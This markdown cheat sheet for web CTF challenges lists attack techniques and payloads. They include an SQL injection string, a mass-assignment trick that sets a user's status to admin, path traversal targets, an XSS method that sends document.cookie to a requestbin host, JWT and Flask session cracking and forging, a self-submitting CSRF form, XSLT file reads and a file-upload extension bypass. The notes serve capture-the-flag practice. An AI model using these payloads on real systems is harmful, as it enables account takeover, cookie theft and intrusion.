[BACK](../README.md)
# Web

- Inspect HTML
- Inspect JS
- Inspect Debug tab
- Inspect CSS
- Search for /robots.txt
  - Needs to be at the root of the website
- If the server is apache, try /.htaccess
- If MacOS: try /.DS_Store
- humans.txt
- Change user agent
- Try every verb
- Check cookie
  - try to modify it
When prompted for a password:

- Try switching request to put or post

## SQL Injection

```sql
' OR 1 = 1 UNION SELECT 1
```
If error:
- Try adding a limit to the amount of Rows
- Try adding more columns

#### If () are blocked:  
```javascript
 `${console.log`test`}`
 //instead of
 console.log("test")
 ```
## API
- Check OPTIONS verb
- Try every verb
- Check openAPI/SwaggerUI endpoint
- Try passing more fields in an "update" endpoint

ex: If the user object is this: 
```json
{
    "username":"username",
    "status":"user"
}
```
and the update endpoint asks for this:
```json
{
    "username":"username"
}
```
Pass this:
```json
{
    "username":"username",
    "status":"admin"
}
```

## Path Traversal

Useful to check:
- admin.php
- login.php
- Add ~ at the end of the php files
    - Vim backup files are stored with the file name + ~
- /etc/apache2/sites-enabled/000-default or /etc/apache2/sites-available/default
## XSS

To try to intercept requests from the page:

https://requestbin.myworkato.com/

Can add link to img src, or change window.location to this and add "?flag=" + document.cookie

### Different Angular XSS payloads
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md
    
## JWT

- https://jwt.io/
- https://github.com/lmammino/jwt-cracker
  - Needed for `crackjwt.sh`
```bash
crackjwt.sh [jwtToken]
```

For RSA signed tokens:

- Burpsuite JWT Editor extension
  - Create a RSA key
  - In the repeater on the request sent with the cookie
  - "Attack" button -> Embedded JWK


## Flask/Python web

if urllib.parse used with urlsplit:
- add `a:` in front of the scheme to break the split (scheme returned in the url)
- add a `?` after the scheme to break (url returned in query)
- same with `#` to return everthing in fragment 

### Flask session token:
- https://github.com/Paradoxis/Flask-Unsign
  - Needed for `crack_flask_token.sh` and `edit_flask_token.sh`
- https://www.kirsle.net/wizards/flask-session.cgi

```bash
crack_flask_token.sh [token]
```

```bash
edit_flask_token.sh [payload] [secret]
```

## CSRF

To recognize:

- Only protection is a Session cookie
- no headers with "CSRF"

Payload example:
```html
<iframe style="display:none" name="csrf-frame"></iframe>
    <form  id="csrf-form" target="csrf-frame" action="[LINK]" method="[METHOD]" enctype="[ENCODING_TYPE]">
      <input type="text" name="[FIELD_NAME]" value="[WANTED_VALUE]" />
      <input type="submit" value="Submit" />
    </form>
<script>document.getElementById("csrf-form").submit()</script>
```

https://security.love/CSRF-PoC-Genorator/

- If there is a CSRF token sent with the request:
  - Try removing it
  - Try switching one char
  - Try switching it with one from another request

## XSLT

https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20XSLT%20Processing%20Security%20and%20Server%20Side%20Request%20Forgeries%20-%20OWASP%20Switzerland%20Meeting%202015.pdf
Read file:
- document('[FILE_NAME]') (XSLT 1.0)
- unparsed_text('[FILE_NAME]') (XSLT 2.0)
- php:function('file_get_contents','[FILE_NAME]')
- php:function('opendir','[DIR]') -> php:function('readdir') * amount of files toread

## Mock Server/API:
https://beeceptor.com/

## File uplaod 
https://book.hacktricks.xyz/pentesting-web/file-upload
- Addd a %0a to the name of the file between the .png and .php
  - ex: test.png%0a.php

## Swagger endpoints:
- /swagger-ui/index.html
- /swagger
- /swagger-ui
- /docs
- /redoc
- /openapi.json